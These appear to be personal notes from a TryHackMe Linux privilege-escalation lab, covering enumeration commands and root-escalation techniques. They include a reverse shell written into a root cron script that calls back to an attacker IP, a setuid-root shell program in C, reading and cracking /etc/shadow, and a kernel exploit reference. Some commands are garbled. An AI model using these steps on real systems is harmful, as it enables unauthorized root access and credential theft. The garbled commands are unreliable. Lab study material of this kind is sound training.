- room link: https://tryhackme.com/r/room/linprivesc
- `hostname` - returns the hostname of the target machine.
-  `uname -a` - returns system info and kernel info, useful for finding kernel vulnerabilities for kernel privesc
- `/proc/version` -  besides kernel info, it may give additional info like **GCC** compiler info
- `/etc/issue` - info about the operating system
- `ps` (Process Status) will show the processes running on the current shell.
	-  `ps -A` - display all running processes
	-  `ps axjf` - process tree
	-  `ps aux` - display processes for all users
- `env` - display environmental variables
- `sudo -l` - display all commands that can be run with root privileges
- `ls` - display all the contents of a folder (don't forget to use the `-la` parameter)
- `id` - display user's privilege level and group memberships
- `/etc/passwd` - for discovering users
	- `cat /etc/passwd | cut -d ":" -f 1` - can be used for brute force attacks (returns list of all users on the system)
	- `cat /etc/passwd | grep home` - list users that have a home directory
-  `history` - command history, might be useful
-  `ifconfig` - network info about the system
-  `ip route` - network routes
-  `netstat` - display all existing communications
	-  `netstat -a` - all listening ports and established connections
	-  `netstat -at` or `netstat -au` - list TCP or UDP protocols respectively
	-  `netstat -l` - listening ports (`netstat -lt` - display all listening ports that are using TCP)
	-  `netstat -s` - listening ports usage by protocol (`-t` or `-u` limit the output to a specific protocol)
	- `netstat -tp` - list connections with the service name and PID information (`-ltp` can also be used for listing all listening ports)
	- `netstat -i` - interface statistics
	- `netstat -ano` - display all sockets, do not resolve names, display timers

**Find files:**
- `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
- `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
- `find / -type d -name config`: find the directory named config under “/”
- `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
- `find / -perm a=x`: find executable files
- `find /home -user frank`: find all files for user “frank” under “/home”
- `find / -mtime 10`: find files that were modified in the last 10 days
- `find / -atime 10`: find files that were accessed in the last 10 day
- `find / -cmin -60`: find files changed within the last hour (60 minutes)
- `find / -amin -60`: find files accesses within the last hour (60 minutes)
- `find / -size 50M`: find files with a 50 MB size
- `find / -size +100M` - display all files larger than 100 mb
- filter errors with `2>/dev/null`
- `find / -writable -type d 2>/dev/null` : Find world-writeable folders
- `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
- `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders
- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

###### Kernel exploits
- used https://www.exploit-db.com/exploits/37292 for getting root privileges. (the machine had a vulnerable kernel version: 3.13.0-24-generic)

###### Sudo
- `sudo` allows us to execute commands with root privileges
- i used `sudo -l` to see what commands can 'karen' run with root privileges. `less` was then used to see the contents of the flag

###### SUID
-  files that have the SUID (Set-user Identification) flag set can be executed with the owner's privileges 
-  `find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set. "base64" had the SUID flag set and the file owner was "root". I could read protected files with `base64 "$LFILE" | base64 --decode`, e.g. `base64 "/etc/passwd" | base64 --decode`
- `unshadow`: can be used to merge `/etc/passwd` and `/etc/shadow`.
- `john` (John the Ripper) can be used on the merged file for password cracking.
- set the SUID flag with `chmod +s <executable>`

###### Capabilities
- "Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user."
-  `getcaps / -r 2>/dev/null` - list all capabilities

###### Cron Jobs
- "Cron jobs are used to run scripts or binaries at specific times."
- `cat /etc/crontab` - i found a `backup.sh` script with `root` as the file owner running as root every minute. i changed the contents of the script to: `sh -i >& /dev/tcp/10.21.55.48/6969 0>&1` and set up a listener with netcat: `nc -lnvp 6969` and waited for the script to run. After the script was executed i got root privileges. 
- i got the flag in `/home/ubuntu`
- i cracked Matt's password by merging `/etc/passwd` and `/etc/shadow` into `unshadowed.txt` for `john`(John the ripper), a tool used for hash cracking, command: `john unshadowed.txt`. The password was `123456`

###### PATH
-  "Writable folders are directories on a filesystem where a user or process has permission to **create, modify, or delete files** within that directory."
-  `find / -writable 2>/dev/null` - search for writable folders
	-  `find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u` - cleaner output
	-  `find / -writable 2>/dev/null | grep usr | cut -d "/" -f 2,3 | sort -u` - cleaner output, get all the folder that contain "usr"
	- An alternative could be the command below. `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u` . We have added “grep -v proc” to get rid of the many results related to running processes.

- `/tmp` is a writable folder, add it to PATH using `export PATH=/tmp:$PATH`
- flag: i had an executable `test` which has the file owner as `root`. `test` searches for `thm` and executes it. I added the folder `/tmp` as a PATH variable and I added `thm` to `/tmp` so `thm` can be executed from anywhere. The `thm` script: `/bin/bash` for spawning a shell with root privileges.

###### NFS (Netword File Sharing)
-  root [[ssh (secure shell)]] private key
-  misconfigured network shell
-  NFS (Network File Sharing) configuration in `/etc/exports` usually. `no_root_squash
- `showmount -e <target_ip>` for enumerating mountable shares
- users can use `mount` to connect to these "shares" (directories) on a NFS server.
- mountable shares are specified in `/etc/exports`
- set the SUID flag with `chmod +s <executable>`
- `mount.nfs: failed to apply fstab options`. For this error run `mount` with `sudo`
- `df -h` : check mounted directories
- `sudo umount`: **unmount** directory
-  if you want to remount a directory to a different nfs share you have to unmount it first.
- FIRST MOUNT THE DIRECTORY AND THEN MAKE CHANGES TO IT!!!!!
- if there any error related to libc version, compile the c program with `-static` (the program will not require an external libc library anymore) 
- "The `-static` argument in **GCC (GNU Compiler Collection)** is used to **link the program statically** with the libraries, as opposed to the default dynamic linking. This means that when you compile a program with `-static`, the necessary library files are bundled directly into the final executable, rather than relying on external shared libraries (like `.so` files) to be available on the system when the program is executed." via chatgpt
 ```c
 #include <stdlib.h>
 #include <unistd.h>
 int main()
 { setgid(0);
 setuid(0);
 system("/bin/bash");
 return 0;
 }
 ```
 - `sudo chmod +sx program.c -o program -static`
 - `gcc nfs.c -o nfs -w` ?
###### Capstone Challenge
- explore more privilege escalation vectors

### **What is Horizontal Privilege Escalation?**

In horizontal privilege escalation, an attacker compromises another user account without increasing their privilege level. For example, moving from one non-administrative user to another or accessing resources/data meant for a different user.

## Path variable exploitation